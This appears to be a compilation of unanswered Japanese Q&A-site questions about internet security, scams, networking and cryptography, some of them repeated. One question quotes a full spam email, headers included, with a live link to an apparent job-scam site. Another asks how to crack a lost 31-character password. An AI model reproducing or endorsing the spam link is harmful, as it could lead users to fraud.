暗号を入力してもやり直しばかりです。どうしたらいいですか？あと、認証できてません。ってどうやってすればいんですか？何をすればいいですか？
来月8/4に米国ラスベガスでDARPA CYBER GRAND CHALLENGEの決勝が開催されます。ネットで調べて、どういう大会なのか何となく分かったのですが、具体的なルールがよく分かりませんでした。。また実際に会場で観戦した場合、試合中何が起きているか分かるものなのでしょうか？一般にも開放されているようなので、素人が観戦してもある程度は理解できるものと期待してますが、、 誰か詳しい方、回答宜しくお願いします。 https://cgc.darpa.mil/
vlan対応のUSB接続プリントサーバーをご存知の方ご享受ください
暗号を入力してもやり直しばかりです。どうしたらいいですか？あと、認証できてません。ってどうやってすればいんですか？何をすればいいですか？
企業が処分したような、中古で投げ売りされているルータを弄繰り回す用に1台買って、技術力を高める訓練をしようと思っているのですが、「ヤマハ」のルータと「Cisco」のルータのどちらを買った方が良いでしょうか?
eo光を使っています。Wi-Fiの速度改善のため、新しく無線ルーターを購入しました。 その設定の中でeo光のIDとパスの入力が必要になっていました。 eo光のIDとパスが書かれた初期の書類を紛失しており、ネットから調べるにも連絡用メールアドレスが違うらしく確認できません。 IDとパス、連絡用メールアドレスが分からない状態でIDとパスを確認する方法はありませんか？ よろしくお願いします。
こういう画面がしょっちゅう出ます。詐欺だから、気にせず閉じるようにと、調べたら書いてあるのですが、これが邪魔でネットが使えず困っています。 それに、カウントダウンとか、読み込みをしていますとか、バイブが鳴りまくったりして怖いです。 本当に閉じるだけで大丈夫でしょうか？
AVGのバージョンアップについて 今フリーの２０１５版を使っているのですが、バージョンアップする必要性はありますか？ 仕様が変わるだけなら変えたくないです。２０１５版でも更新中とでているので、最新のセキュリティは保たれていると判断しています。ご教示ください。
スマートフォンでのインターネット接続の安全性・匿名性スマートフォンでインターネット接続をしてメールを送る場合、キャリア回線を使う場合にしても、自分が所有のwifiルーターやWimaxを使う場合でも、店舗や公共空間のwifi電波を利用する場合でもいずれの場合でも、自宅のパソコンでインターネットをしてメール等を送るよりも住所や氏名などの個人情報は安全に守られる、つまりセキュリティレベルが高いと言えるでしょうか
ビットコインに詳しい人お願いします！ 最近ビットコインについて調べていますが専門外でいろいろわからないので質問させてください。質問1 ビットコインは、分散型台帳技術（ブロックチェーン）を使った決済システムだそうで、 このビットコインが、セキュリティに強いのは台帳が分散管理であることでという点で納得できるのですが、このチェック機能とプライバシーはどのように共存しているのですか？不正のチェックが働くということと取引者が特定されないことには矛盾がないのでしょうか？ 質問2 ビットコインが唯一無二である点はどんな点ですか？仮想通貨は約600種ちかくあるそうで、ブロックチェーン技術の構築自体は他にもたくさん作れるのではないかと思うのですが、ビットコインには他で真似できない何かががあるのでビットコインに価値があるんだと思うのですが、その価値とはなんですか？ 質問3 ビットコインのシステムについて今後重大な不備があった場合、管理者がいないことで誰が修正を行うのですか？ 質問4 ビットコインについての正式な概要はどこで見られますか？ 以上4点について回答よろしくお願いいたします<m(__)m>
ネットに本名(名字)を書かれました。そこの会社に消去依頼出したんですけど、消してくれません どーしたらいいですか？？
ワンタイムトークンについての質問です。 クロスサイトリクエストフォージュリに対する対策として、hiddenタグにワンラタイムトークンを仕込むというのがあります。ログイン画面にクライアントがアクセスした時にワンタイムトークンを発行し、これをサーバ側で保存し、さらにクライアントに送ります。そして、クライアントがユーザー名・パスワードとともに、ワンタイムトークンをサーバに送ることで、ログイン画面を経由した正規のアクセスであることを保証しています。（CSRFで想定されるログイン画面を経由しないアクセスはできない） この仕組みについて、質問が二点あります。 まず、ワンタイムトークンは認証の時にやり取りされているわけですが、以降のリクエストの送信の時はどうなるのでしょうか。 以降のリクエストの送信の時はワンタイムトークンは送られるのでしょうか。 おそらく、ログイン認証の際の一度のみに使われるから、「ワンタイム」トークンだと思うのですが、確認しておきます。 二つ目ですが、ログインしたのち、そのサイトとは別のサイト等を閲覧していて、何かのリンクをクリックして、CSRFに引っかかったとします。 その場合、基本的にはタイムアウトの時間内であればそのログインしたwebサイトの中身にアクセスできるわけですが、どうなるのでしょうか。 アクセスできるわけなので、攻撃者の意図する行為が実現されてしますのではないかと考えましたが、実際どうなのでしょうか。 回答お願いします。
webコンテンツの利用履歴があり退会確認が取れない為、料金が発生しております。至急退会のご連絡を下さい。窓口0362068628 というショートメールが友だちのもとに来ました。 そしてびっくりして一瞬電話をかけてしまったらしいです。 相手がでる前にその友だちの方から切ったようですが、大丈夫でしょうか？
先ほど、最近流行ってるお花が入ったリップクリームを売っていますという謳い文句で、偽物を売ってるツイートを見つけました。そのツイートを引用RTして「これ偽物」とツイートしたら、向こうが色々言ってきました。ここまでははっきりいってどうでもいいんですが、ブロックしてるはずの母がそのことに気づいて「あんたTwitterでなんかしたでしょ」とすぐ電話してきました。 なぜブロックしてるはずの母が私のツイートに気づくことが出来るのでしょうか？
ネットで視聴可能なドラマを観ると、途中でブザー音が鳴って停止します。 そもそも、著作権問題でドラマとかってネット上に出しては駄目なんですよね？コンテンツが削除されました・・という場合は、そういうことが原因ですよね？ お勧めドラマ・・として紹介されているので普通に観てしまうのですが、私も違法行為をしているということになるんですか？ そういう人への防犯のために、このようなブザー音？が鳴るようにしているのでしょうか？ ブーーーーと突然鳴り出して、動画も停止し、鳴り止まないので怖くなって毎回強制終了しています。 それともウィルス？今のところ何も問題ありませんが・・・・
IoTデバイスのハニーポットを作成したいと考えているのですが、何か良い実践方法などありませんか？
子供向けの閲覧制限について質問です。 小学校６年生の娘が、親のMacBookAir 2002モデルを自身のIDで使うようになりました。 メールや、Facebookは、まだ登録していないようです。しかし、Googleクロームや、Safariの履歴を見ると、かなり激しいものも見ています。 子供向けに閲覧制限の設定が可能かどうかと、設定の仕方を教えてください。
絵のタッチのことを「絵柄」って言っていますが、あれは正しいのでしょうか？私はネットをするまで絵柄とは模様などのことを言っていたのですが絵の特徴などに対して使いますか？それは正しいのでしょうか？
ソフトバンクエアーについてネットに繋げるエアーですが、あれって例えば今住んでる場所で使っていて、他の場所へ引っ越しする際、持っていって地域によって繋がる繋がらないがあると思いますが、繋がる様なら違う地域でも使えるんでしょうか？
まだ助かる まだ助かる まだたすかる
3日前に新品のsurface3(win8版)を購入し、昨日win10のisoをインストールしてみたらあっさり認証まで出来ました。 無償アップグレード期間が終わっているのになぜですか？？ 回答よろしくお願い致します。
IEEE802.1Xについての質問です。 ① 無線LANクライアント（サプリカント）は通信を開始するために、AP（認証装置）にプローブ信号 （プローブ要求）を送信します。このタイミングで無線LANクライアントが実行したい認証方式を要求。 ② APは無線LANクライアントから指定された認証方式を通知して、EAP処理を開始します。 ③ 指定された認証方式に従い無線LANクライアントと認証サーバとの間でやりとりします。この時点 では、直接トラフィックをやりとりせずに、APが両者のトラフィックをプロトコル変換をしています。 ④ 認証が成功すると認証サーバから認証が成功したことを通知。この時にポートのブロックが解除。 ⑤ 認証サーバはアクセスポイントに対して、ユーザ用のセッション鍵のもとになる情報を送信します。 ⑥ APは認証サーバから受信したセッション鍵の情報から暗号鍵を生成し、無線LANクライアントに配布。 ⑦ 802.1X認証が無事に終えて、かつトラフィックを暗号化するための鍵を手に入れたので通信を開始。 IEEE802.1Xの認証の仕組みを調べているのですが、なかなかわかりやすいものが出なくて、困っております。（記事によって、この技術を別の視点から眺めているようで私のような初学者には難しいです。） 上に示した説明だと、④からよくわかりません。 「ポートのブロック解除」とは何なのでしょうか。 ⑤から⑦もよくわかりません。 まず、認証サーバからセッション鍵の元となる情報がアクセスポイントに送られており、そこからセッション鍵を元にして、暗号鍵を作っていますが、ここで登場したセッション鍵の意味ってあるのでしょうか。 認証に成功した後、普通に暗号鍵を作って、クライアントに渡せばいいのではないでしょうか。 また、暗号鍵を作ってトラフィックを暗号化しているとのことですが、暗号化すると、インターネット上にあるWebサーバーと通信できるのでしょうか。 その暗号化というのは認証局の後悔しているような鍵ではなく、クライアントが属しているIEEE802.1X独自の暗号化手法ですよね？ どなたか回答お願いします。
outlook2007で仕分けを用いた自動転送がうまくいきません。「受信メールのメッセージヘッダーにある文言が含まれていたらメールを転送する」という設定をしてるのですが たまに転送されないことがあります。エラー等はでていません。 ただし、「受信メールのメッセージヘッダーにある文言が含まれていたらコピー指定フォルダに移動する」も同様に設定しているのですが、こちらは必ずコピーが作成されています。 受信メールのの宛先が社内だと飛んでいますが 社外だと飛んでいないようですが違うかもしれません。 同様の事象が発生したりして原因がわかる方いらっしゃいませんか？
ネット見てたらこんなのでてきたんですがなんですか？
軟式野球のボールをネットで買おうと思ったのですが 検定落ちボールが、検定球の半分くらいの値段だったのですが、何処が違うのか、普通に使えるのか教えてください。
noreply@google.comというところからメールが届きました。よくわからず、言われるがまま設定してしまったのですが、このメールアカウントはGoogleの正規なアカウントでしょうか？ また、不正なアカウントだった場合どうすればいいでしょうか？ どなたか解答よろしくお願いします。
ネットで画面遷移していると、 「ad.gunosy.comからXXXX-XXX(ファイル名？)を開くか、また保存しますか？」 というメッセージが出ます。 選択肢は、「ファイルを開く」「保存」「キャンセル」です。 キャンセルを押してもキャンセルできないため、 ×で消していますが何度も出ます。 ファイルをダウンロードしたときのようなメッセージです。 ここ数日出るようになり、不安です。 グノシーのページは見ていません。 例えば、えきねっとのページ等複数ページで出ました。 何かインストールした記憶はないのですが、原因が分かる方いらっしゃいますでしょうか。
Cookieとキャッシュについて。 詳しい方からのご教授をお願いいたします。少し曖昧な質問になってしまいますが、インターネットサイトの運営側が、クッキーやキャッシュから利用者が同一人物かどうか判断するというのは、どういった方法なのでしょうか？ 例えばですが、某サイトにログインするためには、メールアドレスとパスワードが必要です。アドレスはgmailで登録します。運営側は、アドレス・パスワード・キャッシュから同一人物かどうかを判断します。 違う端末でアカウントを新しく作って(アドレスとパスは変更します)ログインしたとします。以前使用していたアカウント(アドレスとパス）でログインしないままでいれば、同一人物だとはバレないとは思います。ただ、その新しい端末で、その某サイトではなく、gmailに以前使用していたアドレスでログインした場合、その後その某サイトに新しく作ったアカウントでログインしても、「gmailにログインした形跡がある」みたいな判断から同一人物だと判断されてしまうことはありますか？ gmailのメールボックスを開く際にも、gmailアカウントのログイン情報(gmailアドレスとパス)を入力しなければいけません。gmailアカウントと某サイトのアカウントは別物ですが、新しい端末から以前使用していたgmailアドレスでgmailアカウントにログインしたら、その形跡が端末に残って某サイトにログインしたときに紐付けさせるのかどうか気になりました。 うまく説明できませんが、クッキーとかキャッシュについて知識がないもので・・・ご理解いただけた方でわかる方は教えてください。
二つの素数 p= 70051, q= 98179 に対し、N=pq, d=6534648607(gcd(d,(p-1)(q-1))=1) とする。このとき、RSA 署名 S = md mod N の処理を通常実装と CRT 実装の両方で行い、 結果が一致することを確認せよ。 この問題の解き方を教えて下さい。 全く分からないのでまず何を調べたらいいのか、どんなソフトを使えばいいのかなどのアドバイスを下さい
ヤフーやネットなどの履歴削除について。 同じパソコンを家族で一台使っています。（アカウントは別です） 自分のアカウントの履歴を削除しても、管理者は私の削除した履歴を見ることができますか？
質問です。 Twitterでログアウトしてしまい、もう1度ログインしようとしたのですがパスワードを忘れてしまい電話番号かメールアドレスを使ってパスワードをリセットしようとしたのですが、前に4つくらいアカウントを作りすべてログアウトしてしまいそこに電話番号を入れていたので今ログインしようとしているアカウントでも同じ電話番号を入れていてパスワードをリセットしようとするとこの電話番号から複数のアカウントが発見されました？みたいな感じになりパスワードをリセットできません。ちなみにメールアドレスも前のと同じものを使っていたためそっちでもログインできません。Twitterにメールを送ってもメールアドレスを更新としか送られて来ません。 どなたか助けてくださいm(_ _)m
AUひかりの速度について（長文失礼します） AUひかりホームギガ対応にて契約しました。届いた機器ONUとBL900HWをつなげ、実際にスピードを測定してみましたところ（BNRスピードテスト）、 有線でBL900HWからつなげ、下り５０Mbpsくらいしか出ませんが、そんなもんなのでしょうか？ 今までのADSLだと６～７Mbpsだったので、速いと言えば速いのですが、ギガと銘打っているだけに ちょっと物足りない感じがしています。 LANケーブルは５eとなっています。 PCのネットワークアダプタを見てみると、 Qualcomm Atheros AR946ｘ Wireless Network Adapter、Realtek PCIe GBE Family Controllerというものがあります。 セキュリティソフトはノートンを利用、PC自体は２年前ほどに購入。 居住地域は北陸、住宅地です。おそらく周りで光回線利用している家庭は少ないです。 以上のことから、もう少しスピードアップできる可能性はありますでしょうか？ 宜しくお願いいたします。
出来れば至急です。 今回PCからネットへ接続していたら急にネットが繋がらなくなりました。 その時の環境ですが、マインクラフト(開放くんでのポート開放済み)自分のマルチサーバー、スカイプ(PCからではなく、wifiに繋いでいたiPhone)やネット閲覧を行っていました。 その途中スカイプが切れたと思ったらwifiに接続できず、pcのネット接続も機能しなくなりました。二階で有線のpcなので一階のルーターを再起動したのですが、効果はありません。 考えられる理由としては ・スカイプ。ポート開放を行ってサーバーで遊ぶのは初めてではありません。ただ今回は携帯でのスカイプとなったのが前回と異なる点と言えます。サーバーに入る人数は自分を含めて二人なので負荷がある訳ではないと思うのですが…。 ・開放くん。「トラブルシューティングを行った場合デフォルトゲートウェイは仕様できません。」と表示されました。 開放くんでのポート開放ではipアドレスを固定した訳ではなく、マカフィーのファイアーウォールの詳細設定から追加をしたものとなっています。(ローカル tcp/ip ポート 445) あと設定を弄ったものは無いと思います、あやふやな知識で危険な開放をしたのは自分に非があると思いますがサポートセンターなどに連絡するとなると色々面倒なので、出来れば自分で解決したいと思っております。お手数ですがお知恵をお貸しください。お願い致します。 Windows 7 64bit intel core i7
【Windows10を外出中に誰かが操作したかをアプリを入れずに知る方法を教えてください】Win10はログを取っていますよね？誰かがマウスを操作したとかフォルダを開いたとかメールアプリを立ち上げた時刻とか分かる方法ありますか？ ずっとログイン状態でディスプレイの電源だけ消して外出しています。 本体の電源はずっと付けっぱなしです。 オフには出来ません。 監視ソフトは入れません。 標準ソフトだけで誰か操作したか知りたいです。
”携帯に不足しているアップデートやアプリケーションを今からチェックします。開始するには以下をご確認ください。”という表示がスマホを利用している際に出てしまいました。僕が戻るを押したらなんかダウンロードみたいなのが始まったのですが、大丈夫でしょうか 同じことにあったことのある方、詳しく教えていただけませんか
マレーシアのぺトロナスタワーの予約ができません。予約入力はできますが、 相手にネットが届きません。ウインドウズ10が原因ですか？
パスワード31桁を紛失してしまいました。 完全にランダムでa-z、A-Z、[],./_-^()'&%$#"!+*を使用しています。相当に無謀なことは理解していますが、1年以内に解析する方法はないでしょうか。 また、予算に糸目はつけないと仮定して、どのような設備がどれだけあれば間に合いますか。
脱獄についてです。ios9.3.3でも脱獄が可能になりましたので、私もしました。しかし、モバイルターミナルをインストールしても、すぐに落ちてしまいパスワードを変更することごできません。ios9.3.3ではまだモバイルターミナルを使用できないのでしょうか？ また、その場合パスワードを変更する方法はありますでしょうか？ ご返答お待ちしております。
通信環境が少し悪いところで、ネットをしていて少し止まったので画面を連打したら 変なサイトへとんでお金を請求されました。何かの同意をしてしまっていました。その後すぐに、急いで消して履歴も消したのですが、とても不安です。どうすればいいですか？
無線LANで、APにつなぐ時に、APのパスワード？を入れて接続すると思いますが、あれは認証の鍵、暗号鍵のどちらですか？WPA2でAESの場合でお願いします。 WPA2かAESどっちかのキーだと思うのですが、その場合もう片方のキーはいつ交換するのですか？
盗聴器やGPSについて質問です。ルパン三世や、他アニメなどでよく見ますが、 盗聴器、またはGPSを指輪などの小さいものに付けることって今の時代可能なのでしょうか？ アニメ見てると恐ろしいな( ꒪Д꒪)…と思ってしまいます。 ストーカー行為を受けた事があるので、 気になってしまいました(>_<)。。。 ちなみに今の時代の最小のGPSと最小の盗聴器はどんな物なのでしょうか？
魅娯妬茄作品堕嶺。 倭獅弐玻霧李堕倭。 暗号ですとけますか？ ってきたんですけどわかりますか？
Twitterの削除したDMを警察は復元することができるのですか？
Canon iVIS HF11 のバッテリーチャージャーをなくしてしまったので買いたいのですが、ネットで探してもありません。どなたか、見つけていただけないでしょうか。
初歩的な質問かも知れませんが、iPhoneで楽天シムを使っています。LINEでは年齢認証はできない状態です。(エラーとなり、中古のiPhoneなので、ドコモショップに行っても解除をしてもらえない。)友達とのID検索などはできなくて構わないのですが、ラインスタンプをかいたいのですがはチャージができない(認証が必要)ので買うことができません。 LINEstoreから買おうとしたのですが、やはり認証が必要となります。 なんとか認証をするやり方、またはやらなくてもスタンプが買えるやり方があればどなたか教えてもらえませんか？
アドウェアが削除できなくて困ってますAdw Cleanerを使って異常なプログラムをすべて削除したのですが、クロームを使ってると変な広告と変な検索バー（play bar という名前）がいまだに出てきます。 解決策を教えてください。
早朝5時に三菱銀行から南都銀行へネットで送金した場合、南都銀行で引出し可能なのは何時からでしょうか？
avast!の無料版を使っています。windows10です。 怖くなってすぐ消したのでうろ覚えなのですが、avastから「PC上に安全でないパスワードがありました」という表示がありました。これは、今まで色々なサイトでログインするときに使ってたパスワードが、avast側に筒抜けになってるってことでしょうか？ 不安でたまりません。回答よろしくお願いします。
公開鍵暗号について質問があります。公開鍵と秘密鍵は数学的な関連があるのはわかるのですが、その鍵の取り決めは送信側と受信側でどのように行うのですか？ 直接会って？ 秘密鍵を送るとか？
すみません！！！緊急回答お願いします！！！！さっきLINE交換したネットの人で顔を見せてと言われました、あたしはネット上に顔出すのが嫌なので断りました、そしたらTwitterを友人のハッカーに頼んでハッキングしてもらうって言われました… そんなことほんとにできるのでしょうか？？ 困ってます！垢を変えるのは嫌です(´；ω；｀) ほんとに誰か回答お願いします！
DriverPack Solution というサイトは、安全ですか？https://drp.su/index.htm パソコンの、見つかりにくいような、ドライバが、 結構簡単に、インストールできて、正常に動作してるようですし、 問題もない感じで、重宝してるサイトなのですが、 一緒に、スパイウェア的なものが、 入れられてるような事は、ないのでしょうか？ （avast! で、ウィルス的なものが見つかった事は、今まで特にありません） ネット検索しても、良い評判も、悪い評判も、見つからず、 優良サイトなら、もっと記事や、PC情報サイトなどで、 紹介されてても良さそうですが、それも、無いようです？ かといって、悪評も、見つからないのですが、 ドライバ検索総合サイトとして、安全なサイトなのでしょうか？
インシデントレスポンスという言葉について これは、ITセキュリティ内での用語ですか？それとも、ITインシデント全般で使える言葉ですか？
中古のTENVIS JPT-3815W ネットワークカメラを買いましたが、パスワードがわかりません＞＜； 困ってます、 初期状態に戻す方法や、パスワード判明方法をご存知でしたら教えてください。「メーカーに聞けばよい」や「無理です」とかの回答ではなく、本当の知識ある人助けてくださいm(__)m お願いします。
PCのウイルス対策のセキュリティソフトについて質問です。有料サポートでPC全般のことにつて教えてくれるようなサービスが各セキュリティソフトにあると思いますが、その電話番号がナビダイヤルでないセキュリティソフトはありますか？ 例えば、ウイルスバスターならデジタルライフサポート（以前はPC＆保険サポートみたいな名前だったと思います）みたいなサービスです。この電話番号がナビダイヤルではなく、普通の電話番号かフリーダイヤルの所ってありますか？スマホ(かけ放題)からかけて通話料がかからないものを探しています。ご存知の方よろしくお願いします。
web上には、「行動ターゲティング広告」なるものがあり、ショッピングサイトで検索したものや、関連の商品が、サイト上に表示されると承知しています。ところが最近になって、そういった広告だと思われる欄に、今まで検索した物とは全く無関係な商品や自分の趣味嗜好とは全く異なる嫌悪感すらおぼえるような商品が表示されるようになりました。 ネットで調べてブラウザのCookieやキャッシュを削除しても全くといっていいほど効果がありません。 怖くなっていろいろ調べましたが、対処方法や相談するところなど全くわかりません。 こんなことってあるのでしょうか？
ワンクリック詐欺に引っかかりました。 タップした途端、勝手に「会員登録が終了しました」といった内容の長文が出てきて、勝手にどこかの電話番号へ発信させられそうになりました。慌ててスリープモードを押してしまい、その後すぐにつけてからそのページを消しました。その後、「履歴とWebサイトデータを消去」を押しました。実際に発信されたかどうかは不明です。 これってどこまで相手に情報が渡ってしまいましたか？電話番号くらいはバレたでしょうか？ 大丈夫でしょうか？今からでもできる対策はありますか？ 回答よろしくお願いします。
電話をするだけでGPSを受信することって出来るんですか？
暗号理論について 現在，学部で純粋数学，大学院で暗号理論を勉強しております。 総合印刷会社について教えてください。先日，就職担当の教授から，暗号理論を学ぶなら将来はIT系のセキュリティ部門より大日本印刷や凸版印刷を目指したほうがよい。という言うことを聞いたのですが本当でしょうか？さらに，他大の就職担当の教授にも同じ事をいわれました...。 実際，暗号理論は総合印刷会社ではどのような場面で活躍するのでしょうか？
Googleで雑誌について検索していて、ページを押したら、このページにはウイルスが感染している可能性があります！！！ウィンドウを閉じないで下のGoogleアプリからウイルス感染対策アプリをダウンロードして下さい！！！(ウィンドウ閉じた場合は自己責任です)、と出てきて無視してもう自分でダウンロードしていたアプリでアンチ検索して何も無かったんですけど、これって無視しても大丈夫でしたか？？ こういう系に詳しい方、なったことがある方教えて欲しいです！
スマートフォンでのインターネット接続の安全性・匿名性スマートフォンでインターネット接続をしてメールを送る場合、キャリア回線を使う場合にしても、自分が所有のwifiルーターやWimaxを使う場合でも、店舗や公共空間のwifi電波を利用する場合でもいずれの場合でも、自宅のパソコンでインターネットをしてメール等を送るよりも住所や氏名などの個人情報は安全に守られる、つまりセキュリティレベルが高いと言えるでしょうか
ノートパソコンを買おうと思うんですが何を買えば良いか教えてください 1からお願いします、インターネット環境が無いという設定で。（Wi-Fiとか）
最近自分のメールアドレスからの迷惑メールが増えて困っています。そこで質問なのですが、これは自分のメルアドに偽装されて送られてきたものなのか、 それとも、何らかの理由でアドレスとパスワードが漏洩して実際に自分のメールアカウントが乗っ取られて送信されているのかどうか知りたいです。 以下がヘッダーを含めた全文です。どなたか偽装か乗っ取りか見分けられませんでしょうか？ もし、偽装なら、迷惑メールフィルタなどを活用し、無視しておこうと思いますが、 漏洩であれば対応したいと思います。 ちなみにメールサーバーはlolipopを使用しております。 Return-Path: <自分のメールアドレス> X-Original-To: 自分のメールアドレス Delivered-To: 自分のメールアドレス Received: from mail318.phy.lolipop.jp (localhost [127.0.0.1]) by mail318.phy.lolipop.jp (Postfix) with ESMTP id E58DA1D00478 for <自分のメールアドレス>; Sat, 23 Jul 2016 06:25:32 +0900 (JST) Received: from 172.19.44.37 (172.19.44.37) by mail318.phy.lolipop.jp (LOLIPOP-Fsecure); Sat, 23 Jul 2016 06:25:32 +0900 (JST) X-Virus-Status: clean(LOLIPOP-Fsecure) Received: from mx-proxy002.phy.lolipop.lan (HELO mx-proxy002.phy.lolipop.jp) (172.19.44.37) by mx-proxy002.phy.lolipop.jp (qpsmtpd/0.82) with ESMTP; Sat, 23 Jul 2016 06:25:32 +0900 Received: from 223.176.181.101 (223.176.181.101) by mx-proxy002.phy.lolipop.jp (LOLIPOP-Fsecure); Sat, 23 Jul 2016 06:25:27 +0900 (JST) X-Spam-Status: Yes(LOLIPOP-Fsecure) with VIRUSGW/SPAM_RBL/223.176.181.101[bl.spamcop.net:127.0.0.2] Message-ID: <522FA8FCDBD57B8FF275210608A6522F@DY1ONUO82> From: <自分のメールアドレス> To: <自分のメールアドレス> Subject: hi! Date: 23 Jul 2016 06:26:26 +0400 MIME-Version: 1.0 Content-Type: multipart/alternative; boundary="----=_NextPart_000_0017_01D1E48D.05C36393" X-Priority: 3 X-MSMail-Priority: Normal X-Mailer: Microsoft Outlook Express 6.00.2900.5931 X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5931 ここまでがヘッダー情報です This is a multi-part message in MIME format. ------=_NextPart_000_0017_01D1E48D.05C36393 Content-Type: text/plain; charset="cp-850" Content-Transfer-Encoding: quoted-printable Hello! We are looking for employees working remotely. My name is Rosendo, I am the personnel manager of a large International = company. Most of the work you can do from home, that is, at a distance. Salary is $2500-$5000. If you are interested in this offer, please visit=20 Our Site Best regards! ------=_NextPart_000_0017_01D1E48D.05C36393 Content-Type: text/html; charset="cp-850" Content-Transfer-Encoding: quoted-printable <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> <HTML><HEAD> <META http-equiv=3DContent-Type content=3D"text/html; charset=3Dcp-850"> <META content=3D"MSHTML 6.00.2900.6058" name=3DGENERATOR> <STYLE></STYLE> </HEAD> <BODY bgColor=3D#ffffff> Hello!

We are looking for employees working remotely.

My name is Rosendo, I am the personnel manager of a large International = company.
Most of the work you can do from home, that is, at a distance.
<b>Salary is $2500-$5000.</b>

If you are interested in this offer, please visit <a = href=3D"http://adoratebco.com/modules/mod_cmscore/"><b>Our = Site</b></a>

Best regards!
</BODY></HTML> ------=_NextPart_000_0017_01D1E48D.05C36393--
ネットサーフィンしてたら、【ウィルスに感染しました...OKを押して下さい】みたいなメッセージが出てきました。何もクリックせずにすぐページを閉じ、全部のウィンドウ？を閉じて電源切って再起動しました。 その後迷惑メールがたくさん送られてきました。 これは私の情報が漏れたという事ですか？ 電話はかかって来てないし、名前が知られてるわけではなく、ただ迷惑メールがいっぱい来ます。 メールが来るのは、変なメッセージのせいですか？ 情報はどこまで漏れているんですか？ よろしくお願いします。
無線ランのＩＰアドレス固定で使用していましたが、不審者の親友の気配を感じた後に確認したら自動設定に変更されていました。これは不審者の侵入の証拠になりますか？
メイプルストーリーでのウェブシステムアカウントの取得方法について・・・。 20代男性です。オンラインゲーム、メイプルストーリーを運営されてる方、答えて頂けたら嬉しいです。自分は最近、高額の賞金が欲しくて、オンラインゲームをプレイするだけでお金を稼ぐ事って出来ないかなと思いネットで調べてみたら、メイプルストーリーのプレイ時間帯でお金を稼ぐ事が出来ると書いてあったので、これは素晴らしい早速登録しようと思いましたが、メイプルストーリーのプレイ時間帯だけで稼ぐ為には、なんでもウェブシステムアカウントとゲームアカウントの取得と、その二つのアカウントを結び付ければ稼げると書いてありまして、そのウェブシステムアカウントは何処で手に入れる事が出来るのかが全く分からないんです。ウェブシステムアカウントは、何処で取得出来るのでしょうか？どうか、教えて下さい。宜しくお願い致します。
こう言ったSMSメッセージが届いたのですが、これは一体どうしたらいいのでしょうか？ 認証などをした場合はどうなるのでしょうか？ ご協力お願い致します。
Twitterについての質問です。 個人情報かもしれないですがおそらく危ないアカウント(何というかわからないです、、RTばっかりしてるようなアカウントのことです)だと思うので画像晒します。 ※でもやっぱり個人情報ですから問題があれば質問消します。 この画像のアカウントから少し前にフォローされてしまい、フォロワーを解除したいのでブロック→解除の流れでフォロワー解除しようと思い、ブロックしてみたのですが、何回試してもこの画像のようになってしまい、ブロックできません。 また、この方がフォローしている人やツイート等は読み込めず、常に表示されません。 この方にフォローされるまであまりこういうアカウントの存在を知らなかったのですが、フォローされてみて怖くなり、フォロワー解除しようと思いました。もちろんフォローは返していません。フォロワー解除できたら鍵をかけようと思っているため、解除したいのですがこのようになってしまうのでしたくてもできません。何か理由、または解除できる方法を教えてください。
暗号解読求む！ ｄｚｍｙｑ２ｓ６ｍｚｑ・ｘ２ｙ、ｙ１ｚｌｗ２ｄｑ
マクロ デジタル認証株の取引で個人の方のブログの中でvba を公開してくださっているのですが、私としてはそのプログラムを使いたいのですが、なにせ、ブログの管理人様をよく知っている訳ではないので、ウイルスバスターなどで、このマクロはウイルスを含んでいる場合があるとか、ウイルスに侵されているとかで、発行者が信頼おける場合以外はマクロを開けないでください。」等となっています。 質問です。 ①以下のコードを見ただけで、このvbaの危険の有無が判断できますか？ ②これを手打ちして自分のエクセルに取り込むのとコピーして取り込むのではリスクの違いがありますか？ ③ダウンロードはリスクがコピーや手打ちより多いですか？ 以上です。よろしくお願いします。 ＳＭＢＣ日興証券用 ログインスクリプト '********************************************************** ' ＳＭＢＣ日興証券ログインへ '********************************************************** 'userdataシートのB11にユーザーＩＤを入れておく Shiten = Sheets("userdata").Range("B11").Value 'userdataシートのB7にログインパスワードを入れておく Number = Sheets("userdata").Range("B12").Value 'userdataシートのB8に売買パスワードを入れておく UserPass = Sheets("userdata").Range("B13").Value Set objIE = CreateObject("InternetExplorer.application") objIE.Visible = True '画面表示ON objIE.navigate "https://trade.smbcnikko.co.jp/Login/0/login/ipan_web/hyoji/" '表示待ち Do While objIE.Busy = True DoEvents Loop Do While objIE.Document.readyState <> "complete" DoEvents Loop objIE.Document.all.koza1.Value = Shiten' 支店コード objIE.Document.all.koza2.Value = Number' 口座番号 objIE.Document.all.passwd.Value = UserPass' パスワード objIE.Document.forms(1).Submit’ ログインボタン押 End Sub '発注用(新規買い) '********************************************************** ' ＳＭＢＣ日興証券 信用新規買 For Each Obj In objIE.Document.getElementsByTagName("a") If Obj.innerText = "信用:新規買付" Then Obj.Click Exit For End If Next '表示待ち Do While objIE.Busy = True DoEvents Loop Do While objIE.Document.readyState <> "complete" DoEvents Loop Application.Wait Time:=Now + TimeValue("00:00:01") objIE.Document.all.meigCd.Value = Ncode ' Ncodeは証券コード objIE.Document.getElementsByName("sinyoToriKbn")(0).Click ' 制度信用 objIE.Document.all.suryo.Value = Nkabu ' Nkabuは発注数 objIE.Document.getElementsByName("nariSasiKbn")(1).Checked = True' 成行 objIE.Document.getElementsByName("cnd12")(0).Checked = True ' 引成 objIE.Document.getElementsByName("yukokikan")(0).Click ' 有効期限：当日中 objIE.Document.getElementsByName("kozaKbnSinyo")(1).Click ' 口座区分：特定 '表示待ち Do While objIE.Busy = True DoEvents Loop Do While objIE.Document.readyState <> "complete" DoEvents Loop objIE.Document.forms(1).Submit ' 確認画面へ '表示待ち Do While objIE.Busy = True DoEvents Loop Do While objIE.Document.readyState <> "complete" DoEvents Loop objIE.Document.forms(2).Submit ' 発注 End Sub '発注用(新規売) '********************************************************** ' ＳＭＢＣ日興証券 信用新規売 For Each Obj In objIE.Document.getElementsByTagName("a") If Obj.innerText = "信用:新規売付" Then Obj.Click Exit For End If Next '表示待ち Do While objIE.Busy = True DoEvents Loop Do While objIE.Document.readyState <> "complete" DoEvents Loop Application.Wait Time:=Now + TimeValue("00:00:01") objIE.Document.all.meigCd.Value = Ncode ' Ncodeは証券コード objIE.Document.all.suryo.Value = Nkabu ' Nkabuは発注数 objIE.Document.getElementsByName("nariSasiKbn")(1).Checked = True' 成行 objIE.Document.getElementsByName("cnd12")(0).Checked = True ' 引成 objIE.Document.getElementsByName("yukokikan")(0).Click ' 有効期限：当日中 objIE.Document.getElementsByName("kozaKbnSinyo")(1).Click ' 